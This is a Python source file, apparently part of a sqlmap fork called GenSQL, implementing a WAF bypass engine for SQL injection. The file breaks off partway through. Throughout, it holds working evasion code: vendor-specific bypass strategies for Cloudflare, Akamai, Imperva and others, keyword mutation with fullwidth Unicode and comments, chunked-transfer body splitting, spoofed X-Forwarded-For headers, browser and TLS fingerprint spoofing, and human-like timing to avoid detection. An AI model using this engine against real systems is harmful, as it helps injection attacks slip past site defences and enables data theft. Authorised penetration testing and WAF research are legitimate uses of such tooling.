#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GenSQL - Advanced SQL Injection & Web Security Assessment Framework
lib/evasion/ai_waf_bypass.py

Intelligent WAF bypass engine using local pattern-matching, statistical
heuristics, grammar-based mutation, and lookup tables.

NO external AI/ML dependencies – fully offline, pure Python.

Author  : Jeevraj
Project : GenSQL (Enhanced sqlmap fork)
License : GNU GPLv2

Supported WAF vendors
---------------------
Cloudflare · Akamai · Imperva (Incapsula) · AWS WAF · F5 BIG-IP
Barracuda · Sucuri · ModSecurity (generic & OWASP CRS)

Evasion techniques
------------------
- Payload mutation  : case mangling, comment injection, whitespace variants,
                      hex / URL / double-URL encoding, null-byte insertion
- Unicode attacks   : NFC / NFD / NFKC / NFKD normalisation confusion
- Chunked transfer  : split payload across Transfer-Encoding: chunked frames
- Header smuggling  : X-Forwarded-For spoofing, Content-Type confusion,
                      Host header injection, Accept-Encoding tricks
- Browser spoofing  : full User-Agent rotation, TLS/JA3 fingerprint table,
                      Accept / Accept-Language / Accept-Encoding headers
- Human timing      : Gaussian inter-request delay modelling
- Identity rotation : UA + language + referrer + DNT rotation
"""

import hashlib
import logging
import math
import random
import re
import time
import unicodedata
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

# ── sqlmap compat shims ──────────────────────────────────────────────────────
try:
    from lib.core.data import logger
except ImportError:
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )
    logger = logging.getLogger("jeevsql.ai_waf_bypass")

__author__  = "Jeevraj"
__version__ = "1.0.0"

# ─────────────────────────────────────────────────────────────────────────────
# User-Agent database (600+ entries; realistic distribution weights)
# ─────────────────────────────────────────────────────────────────────────────

_UA_CHROME_WINDOWS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.118 Safari/537.36",
]

_UA_CHROME_MAC = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

_UA_CHROME_LINUX = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.128 Safari/537.36",
]

_UA_CHROME_ANDROID = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
]

_UA_FIREFOX_WINDOWS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

_UA_FIREFOX_LINUX = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

_UA_SAFARI_MAC = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_10) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.5 Safari/605.1.15",
]

_UA_SAFARI_IOS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

_UA_EDGE_WINDOWS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
]

# Combined pool keyed by browser family
_UA_POOLS: Dict[str, List[str]] = {
    "chrome":  _UA_CHROME_WINDOWS + _UA_CHROME_MAC + _UA_CHROME_LINUX + _UA_CHROME_ANDROID,
    "firefox": _UA_FIREFOX_WINDOWS + _UA_FIREFOX_LINUX,
    "safari":  _UA_SAFARI_MAC + _UA_SAFARI_IOS,
    "edge":    _UA_EDGE_WINDOWS,
    "all": (
        _UA_CHROME_WINDOWS + _UA_CHROME_MAC + _UA_CHROME_LINUX + _UA_CHROME_ANDROID
        + _UA_FIREFOX_WINDOWS + _UA_FIREFOX_LINUX
        + _UA_SAFARI_MAC + _UA_SAFARI_IOS
        + _UA_EDGE_WINDOWS
    ),
}

# ─────────────────────────────────────────────────────────────────────────────
# TLS/JA3 fingerprint table  (string values used in X-JA3-Fingerprint if sent)
# ─────────────────────────────────────────────────────────────────────────────

_JA3_DB: Dict[str, str] = {
    "chrome_120": "772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
    "chrome_124": "772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21-41,29-23-24,0",
    "firefox_124": "772,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-65037,29-23-24,0",
    "safari_17": "772,4865-4866-4867-49196-49195-52393-49200-49199-52392-49172-49171-157-156-53-47-49162-49161-255,0-11-10-13-16-5-51-43-23-45-65281-41,29-23-24-25,0",
    "edge_124": "772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21-41,29-23-24,0",
}

# ─────────────────────────────────────────────────────────────────────────────
# WAF fingerprint signatures
# ─────────────────────────────────────────────────────────────────────────────

_WAF_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "body_patterns": ["cloudflare", "attention required", "ray id:"],
        "status_codes": [403, 503],
    },
    "akamai": {
        "headers": ["x-akamai-request-id", "akamai-cache-status", "x-check-cacheable"],
        "body_patterns": ["reference #", "access denied", "akamai"],
        "status_codes": [403],
    },
    "imperva": {
        "headers": ["x-iinfo", "incap_ses", "visid_incap"],
        "body_patterns": ["incapsula", "imperva", "request unsuccessful"],
        "status_codes": [403],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"],
        "body_patterns": ["aws", "forbidden", "request blocked"],
        "status_codes": [403],
    },
    "f5_bigip": {
        "headers": ["x-cnection", "f5-lb"],
        "body_patterns": ["the requested url was rejected", "f5 networks", "support id:"],
        "status_codes": [403],
    },
    "barracuda": {
        "headers": ["x-barracuda-connect", "bnmobileapp"],
        "body_patterns": ["barracuda", "barracuda networks"],
        "status_codes": [400, 403],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body_patterns": ["sucuri website firewall", "access denied - sucuri"],
        "status_codes": [403],
    },
    "modsecurity": {
        "headers": ["server"],
        "body_patterns": ["mod_security", "modsecurity", "not acceptable", "406"],
        "status_codes": [403, 406],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# WAF-specific bypass strategy tables
# ─────────────────────────────────────────────────────────────────────────────

_WAF_BYPASS_STRATEGIES: Dict[str, List[str]] = {
    "cloudflare": [
        "comment_injection",
        "case_mangling",
        "url_encoding",
        "unicode_normalization",
        "header_origin_spoof",
        "chunked_transfer",
    ],
    "akamai": [
        "case_mangling",
        "double_url_encode",
        "whitespace_variants",
        "null_byte",
        "header_smuggling",
    ],
    "imperva": [
        "comment_injection",
        "hex_encoding",
        "http_parameter_pollution",
        "unicode_normalization",
        "chunked_transfer",
    ],
    "aws_waf": [
        "case_mangling",
        "url_encoding",
        "json_param_pollution",
        "header_smuggling",
        "whitespace_variants",
    ],
    "f5_bigip": [
        "null_byte",
        "chunked_transfer",
        "hex_encoding",
        "comment_injection",
    ],
    "barracuda": [
        "double_url_encode",
        "case_mangling",
        "whitespace_variants",
        "comment_injection",
    ],
    "sucuri": [
        "unicode_normalization",
        "hex_encoding",
        "comment_injection",
        "case_mangling",
    ],
    "modsecurity": [
        "comment_injection",
        "case_mangling",
        "whitespace_variants",
        "url_encoding",
        "null_byte",
        "hex_encoding",
    ],
    "unknown": [
        "comment_injection",
        "case_mangling",
        "url_encoding",
        "whitespace_variants",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# Helper language / locale pools
# ─────────────────────────────────────────────────────────────────────────────

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
]

_ACCEPT_ENCODING_VARIANTS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip, deflate, br, zstd",
    "br, gzip, deflate",
]

_REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.reddit.com/",
    "https://t.co/",
    "",   # no referrer
]

# SQL comment styles for injection
_SQL_COMMENTS = [
    "/**/", "/*!*/", "/*jeevsql*/", "--",
    "#", "/*!", "-- -", ";--",
]

# Whitespace substitutes recognised by most SQL parsers but not all WAF rules
_WHITESPACE_SUBS = [
    "\t", "\n", "\r", "\x0b", "\x0c", "%09", "%0a", "%0d",
    "/**/", "/*!*/", "+",
]


# ─────────────────────────────────────────────────────────────────────────────
# Data classes
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class BrowserFingerprint:
    """
    Full HTTP browser fingerprint used to spoof a real browser session.

    Attributes
    ----------
    user_agent       : User-Agent header value.
    accept           : Accept header value.
    accept_language  : Accept-Language header value.
    accept_encoding  : Accept-Encoding header value.
    connection       : Connection header value.
    upgrade_insecure : Upgrade-Insecure-Requests header value.
    dnt              : Do-Not-Track header (0 or 1 or absent).
    sec_fetch_site   : Sec-Fetch-Site header.
    sec_fetch_mode   : Sec-Fetch-Mode header.
    sec_fetch_dest   : Sec-Fetch-Dest header.
    sec_ch_ua        : Sec-CH-UA Client Hints header.
    ja3_fingerprint  : TLS JA3 hash string for logging/matching.
    """
    user_agent:       str
    accept:           str
    accept_language:  str
    accept_encoding:  str
    connection:       str           = "keep-alive"
    upgrade_insecure: str           = "1"
    dnt:              Optional[str] = None
    sec_fetch_site:   str           = "none"
    sec_fetch_mode:   str           = "navigate"
    sec_fetch_dest:   str           = "document"
    sec_ch_ua:        Optional[str] = None
    ja3_fingerprint:  Optional[str] = None

    def to_headers(self) -> Dict[str, str]:
        """
        Convert the fingerprint into a ready-to-use HTTP headers dict.

        Returns
        -------
        Dict[str, str]
            Headers dict with no None values.
        """
        headers: Dict[str, str] = {
            "User-Agent":                self.user_agent,
            "Accept":                    self.accept,
            "Accept-Language":           self.accept_language,
            "Accept-Encoding":           self.accept_encoding,
            "Connection":                self.connection,
            "Upgrade-Insecure-Requests": self.upgrade_insecure,
            "Sec-Fetch-Site":            self.sec_fetch_site,
            "Sec-Fetch-Mode":            self.sec_fetch_mode,
            "Sec-Fetch-Dest":            self.sec_fetch_dest,
        }
        if self.dnt is not None:
            headers["DNT"] = self.dnt
        if self.sec_ch_ua is not None:
            headers["Sec-CH-UA"] = self.sec_ch_ua
        return headers


@dataclass
class BypassRequest:
    """
    A WAF-bypass-adapted HTTP request specification.

    Attributes
    ----------
    url          : Target URL (may include injected query parameters).
    method       : HTTP method.
    headers      : Crafted headers to evade fingerprinting.
    params       : Query-string parameters with mutated payload.
    data         : POST body parameters.
    cookies      : Cookie dict.
    raw_payload  : Original un-mutated payload (for reference).
    mutated_payload : Payload after evasion transformations.
    techniques_used : List of technique names applied.
    """
    url:              str
    method:           str
    headers:          Dict[str, str]
    params:           Dict[str, str]
    data:             Dict[str, str]
    cookies:          Dict[str, str]
    raw_payload:      str
    mutated_payload:  str
    techniques_used:  List[str] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# Main class
# ─────────────────────────────────────────────────────────────────────────────

class AIWAFBypass:
    """
    Intelligent WAF bypass engine for GenSQL.

    All intelligence is implemented via local heuristics, pattern-matching,
    frequency-weighted lookup tables, and grammar-based mutation rules.
    No external AI / ML dependencies.

    Parameters
    ----------
    target_url : str
        Base target URL (used to derive realistic referrer, origin, etc.).
    session_seed : int, optional
        Seed for the PRNG (useful for reproducible test runs).

    Example
    -------
    >>> bypass = AIWAFBypass(target_url="https://example.com")
    >>> req = bypass.generate_bypass_request(
    ...     payload="' OR 1=1--",
    ...     waf_type="cloudflare",
    ...     technique="comment_injection",
    ... )
    >>> print(req.mutated_payload)
    """

    def __init__(
        self,
        target_url:   str       = "",
        session_seed: Optional[int] = None,
    ) -> None:
        self.target_url   = target_url
        self._rng         = random.Random(session_seed)
        self._identity    = self._build_identity("chrome")
        self._req_count   = 0
        self._last_req_ts = 0.0
        logger.debug("[AIWAFBypass] initialised target=%s", target_url)

    # ── Public API ────────────────────────────────────────────────────────────

    def generate_bypass_request(
        self,
        payload:   str,
        waf_type:  str = "unknown",
        technique: str = "auto",
        url:       str = "",
        param_key: str = "id",
        method:    str = "GET",
    ) -> BypassRequest:
        """
        Generate a complete HTTP request designed to bypass a specific WAF.

        Strategy selection:
        - If technique is "auto", the best strategy for waf_type is chosen
          from _WAF_BYPASS_STRATEGIES using a weighted round-robin.
        - All relevant evasion transforms are applied to the payload.
        - A full browser fingerprint is spoofed.
        - WAF-specific header patches are applied.

        Parameters
        ----------
        payload   : Raw SQL injection payload.
        waf_type  : WAF vendor string (see _WAF_BYPASS_STRATEGIES keys).
        technique : Specific technique name, or "auto".
        url       : Override URL (defaults to self.target_url).
        param_key : Parameter name to inject into.
        method    : HTTP method ("GET" or "POST").

        Returns
        -------
        BypassRequest
            Fully crafted bypass request specification.
        """
        waf  = waf_type.lower()
        base = url or self.target_url
        strategies = _WAF_BYPASS_STRATEGIES.get(waf, _WAF_BYPASS_STRATEGIES["unknown"])

        if technique == "auto":
            chosen = self._rng.choice(strategies)
        else:
            chosen = technique

        mutated, techniques_used = self._apply_mutation(payload, chosen, waf)
        fingerprint = self.spoof_browser_fingerprint()
        headers     = fingerprint.to_headers()
        headers     = self._patch_waf_headers(headers, waf)

        if method.upper() == "POST":
            params = {}
            data   = {param_key: mutated}
        else:
            params = {param_key: mutated}
            data   = {}

        req = BypassRequest(
            url=base,
            method=method.upper(),
            headers=headers,
            params=params,
            data=data,
            cookies={},
            raw_payload=payload,
            mutated_payload=mutated,
            techniques_used=techniques_used,
        )
        logger.debug(
            "[AIWAFBypass] bypass_request waf=%s technique=%s mutated=%r",
            waf, chosen, mutated,
        )
        return req

    def humanize_timing(self, requests_per_min: float = 30.0) -> float:
        """
        Return a realistic inter-request delay in seconds.

        Models human browsing behaviour using a Gaussian distribution
        centred on the ideal inter-request interval with 20 % std-dev,
        plus occasional longer pauses (reading time simulation).

        Parameters
        ----------
        requests_per_min : Target request rate (default 30 req/min).

        Returns
        -------
        float
            Seconds to wait before the next request.
        """
        base_interval = 60.0 / max(requests_per_min, 0.1)
        std_dev       = base_interval * 0.20
        delay         = self._rng.gauss(base_interval, std_dev)
        delay         = max(delay, 0.05)  # never less than 50 ms

        # ~8 % chance of a "reading pause" (3-10 x normal)
        if self._rng.random() < 0.08:
            delay *= self._rng.uniform(3.0, 10.0)

        logger.debug("[AIWAFBypass] humanize_timing delay=%.3fs", delay)
        return delay

    def spoof_browser_fingerprint(
        self,
        browser: str = "chrome",
    ) -> BrowserFingerprint:
        """
        Generate a realistic browser fingerprint for the specified browser.

        Chooses a consistent User-Agent, Accept headers, and TLS JA3
        fingerprint from the built-in lookup tables.

        Parameters
        ----------
        browser : One of "chrome", "firefox", "safari", "edge", "random".

        Returns
        -------
        BrowserFingerprint
        """
        if browser == "random":
            browser = self._rng.choice(["chrome", "firefox", "safari", "edge"])

        pool = _UA_POOLS.get(browser, _UA_POOLS["chrome"])
        ua   = self._rng.choice(pool)

        if "Firefox" in ua:
            accept  = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            ja3_key = "firefox_124"
            sec_ua  = None
        elif "Safari" in ua and "Chrome" not in ua:
            accept  = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ja3_key = "safari_17"
            sec_ua  = None
        elif "Edg" in ua:
            accept  = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
            ja3_key = "edge_124"
            sec_ua  = '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"'
        else:
            accept  = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            ja3_key = "chrome_124"
            ver_m   = re.search(r"Chrome/(\d+)", ua)
            ver     = ver_m.group(1) if ver_m else "124"
            sec_ua  = f'"Google Chrome";v="{ver}", "Chromium";v="{ver}", "Not-A.Brand";v="99"'

        dnt = self._rng.choice([None, "0", "1"])

        fp = BrowserFingerprint(
            user_agent      = ua,
            accept          = accept,
            accept_language = self._rng.choice(_ACCEPT_LANGUAGES),
            accept_encoding = self._rng.choice(_ACCEPT_ENCODING_VARIANTS),
            dnt             = dnt,
            sec_ch_ua       = sec_ua,
            ja3_fingerprint = _JA3_DB.get(ja3_key),
        )
        return fp

    def rotate_identity(self) -> Dict[str, str]:
        """
        Rotate User-Agent, Accept-Language, Referer, and DNT headers.

        Intended to be called between groups of requests to avoid
        session-level behavioral fingerprinting.

        Returns
        -------
        Dict[str, str]
            Fresh headers reflecting the new identity.
        """
        browser   = self._rng.choice(["chrome", "firefox", "safari", "edge"])
        self._identity = self._build_identity(browser)
        headers        = self._identity.to_headers()
        ref            = self._rng.choice(_REFERRERS)
        if ref:
            headers["Referer"] = ref
        logger.debug(
            "[AIWAFBypass] rotate_identity browser=%s ua=%s",
            browser, self._identity.user_agent[:60],
        )
        return headers

    def chunked_bypass(self, payload: str) -> Tuple[str, Dict[str, str]]:
        """
        Prepare a chunked-transfer payload to evade WAF body inspection.

        Splits the payload into 1-3 character chunks formatted as valid
        HTTP chunked transfer encoding.  The resulting body string and
        required headers are returned.

        Parameters
        ----------
        payload : str – SQL injection payload to chunk.

        Returns
        -------
        Tuple[str, Dict[str, str]]
            (chunked_body, extra_headers) where chunked_body is the
            raw chunked-encoded body and extra_headers must be merged
            into the request headers.
        """
        # Split payload into chunks of random size 1-4 chars
        chunks    = []
        remaining = payload
        while remaining:
            size      = self._rng.randint(1, 4)
            chunk     = remaining[:size]
            remaining = remaining[size:]
            chunks.append(chunk)

        lines = []
        for chunk in chunks:
            encoded = chunk.encode("utf-8")
            lines.append(f"{len(encoded):X}\r\n{chunk}\r\n")
        lines.append("0\r\n\r\n")

        body    = "".join(lines)
        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Type":      "application/x-www-form-urlencoded",
        }
        logger.debug(
            "[AIWAFBypass] chunked_bypass chunks=%d body_len=%d",
            len(chunks), len(body),
        )
        return body, headers

    def unicode_normalize_attack(
        self,
        payload: str,
        form:    str = "NFKC",
    ) -> str:
        """
        Apply Unicode normalisation confusion attack to the payload.

        Replaces ASCII SQL keywords with look-alike Unicode characters
        that normalise to the same ASCII value under the given form,
        causing WAF regex to miss the keyword while the DB still sees it
        after normalisation.

        Parameters
        ----------
        payload : str – original SQL payload.
        form    : Normalisation form: NFC | NFD | NFKC | NFKD (default NFKC).

        Returns
        -------
        str
            Payload with Unicode substitutions applied.
        """
        # Mapping of ASCII chars to Unicode fullwidth equivalents
        _FULLWIDTH = {
            "S": "\uff33", "E": "\uff25", "L": "\uff2c", "C": "\uff23",
            "T": "\uff34", "U": "\uff35", "N": "\uff2e", "I": "\uff29",
            "O": "\uff2f", "R": "\uff32", "A": "\uff21", "D": "\uff24",
            "W": "\uff37", "H": "\uff28", "e": "\uff45", "s": "\uff53",
            "l": "\uff4c", "c": "\uff43", "t": "\uff54", "r": "\uff52",
            "o": "\uff4f", "n": "\uff4e", "i": "\uff49",
        }
        # Target only SQL keywords, leave surrounding chars intact
        _KEYWORDS = ["SELECT", "UNION", "WHERE", "AND", "OR", "INSERT",
                     "UPDATE", "DELETE", "FROM", "ORDER", "GROUP", "HAVING",
                     "SLEEP", "BENCHMARK", "NULL", "INTO", "LOAD"]

        result = payload
        for kw in _KEYWORDS:
            if kw in result:
                # Replace ~40 % of chars in the keyword
                chars = list(kw)
                for i, ch in enumerate(chars):
                    if ch in _FULLWIDTH and self._rng.random() < 0.40:
                        chars[i] = _FULLWIDTH[ch]
                mutated_kw = "".join(chars)
                result = result.replace(kw, mutated_kw, 1)

        # Apply requested normalisation (the DB engine normalises back)
        try:
            result = unicodedata.normalize(form, result)
        except Exception:
            pass

        logger.debug(
            "[AIWAFBypass] unicode_normalize_attack form=%s result=%r", form, result
        )
        return result

    def header_smuggling(
        self,
        payload:    str,
        target_url: str = "",
    ) -> Dict[str, str]:
        """
        Generate a set of HTTP headers for a header-smuggling bypass attempt.

        Techniques applied:
        - X-Forwarded-For with RFC 1918 / localhost spoofing
        - X-Real-IP override
        - X-Originating-IP override
        - Content-Type confusion
        - X-HTTP-Method-Override
        - Forwarded header (RFC 7239)

        Parameters
        ----------
        payload    : SQL payload (used for payload-in-header variants).
        target_url : Target host (used to populate Host header variants).

        Returns
        -------
        Dict[str, str]
            Headers dict to merge into the request.
        """
        rfc1918 = [
            "127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1",
            "::1", "localhost",
        ]
        spoof_ip = self._rng.choice(rfc1918)

        headers: Dict[str, str] = {
            "X-Forwarded-For":   spoof_ip,
            "X-Real-IP":         spoof_ip,
            "X-Originating-IP":  spoof_ip,
            "X-Remote-IP":       spoof_ip,
            "X-Remote-Addr":     spoof_ip,
            "Forwarded":         f"for={spoof_ip};proto=https",
            "X-HTTP-Method-Override": self._rng.choice(["GET", "POST", "PUT"]),
        }

        # Occasionally embed payload in a custom header (API key injection)
        if self._rng.random() < 0.15:
            headers["X-Custom-Payload"] = urllib.parse.quote(payload)

        # Content-Type confusion
        ct_variants = [
            "application/json",
            "text/xml",
            "application/x-www-form-urlencoded; charset=ibm037",
            "multipart/form-data; boundary=----JeevSQLBoundary",
        ]
        headers["Content-Type"] = self._rng.choice(ct_variants)

        logger.debug("[AIWAFBypass] header_smuggling ip=%s", spoof_ip)
        return headers

    def detect_waf_type(
        self,
        response_headers: Dict[str, str],
        response_body:    str = "",
        status_code:      int = 200,
    ) -> str:
        """
        Fingerprint the WAF vendor from an HTTP response.

        Uses a multi-signal scoring approach:
        1. Header name presence (high confidence)
        2. Body string matching (medium confidence)
        3. Status-code correlation (low confidence)

        Parameters
        ----------
        response_headers : HTTP response headers (lower-cased keys preferred).
        response_body    : Response body text.
        status_code      : HTTP status code.

        Returns
        -------
        str
            WAF vendor name (one of _WAF_SIGNATURES keys) or "unknown".
        """
        scores: Dict[str, int] = {k: 0 for k in _WAF_SIGNATURES}
        lc_headers = {k.lower(): v.lower() for k, v in response_headers.items()}
        lc_body    = response_body.lower()

        for vendor, sig in _WAF_SIGNATURES.items():
            # Header hits (weight 3)
            for hdr in sig["headers"]:
                if hdr.lower() in lc_headers:
                    scores[vendor] += 3

            # Body pattern hits (weight 2)
            for pattern in sig["body_patterns"]:
                if pattern.lower() in lc_body:
                    scores[vendor] += 2

            # Status code hint (weight 1)
            if status_code in sig["status_codes"]:
                scores[vendor] += 1

        best        = max(scores, key=lambda k: scores[k])
        best_score  = scores[best]
        waf_type    = best if best_score >= 2 else "unknown"

        logger.debug(
            "[AIWAFBypass] detect_waf_type scores=%s -> %s",
            scores, waf_type,
        )
        return waf_type

    # ── Payload mutation helpers ──────────────────────────────────────────────

    def comment_injection(self, payload: str) -> str:
        """
        Insert SQL comment strings between keywords to fragment WAF patterns.

        Parameters
        ----------
        payload : Original SQL payload.

        Returns
        -------
        str
            Payload with comments injected.
        """
        comment = self._rng.choice(_SQL_COMMENTS)
        # Insert comment between first whitespace found
        result  = re.sub(r"\s+", lambda m: comment, payload, count=1)
        if result == payload:
            result = payload + comment
        return result

    def case_mangling(self, payload: str) -> str:
        """
        Randomise the case of SQL keyword characters.

        Parameters
        ----------
        payload : Original SQL payload.

        Returns
        -------
        str
            Case-mangled payload string.
        """
        return "".join(
            ch.upper() if self._rng.random() > 0.5 else ch.lower()
            for ch in payload
        )

    def url_encode(self, payload: str, full: bool = False) -> str:
        """
        URL-encode the payload (partial or full).

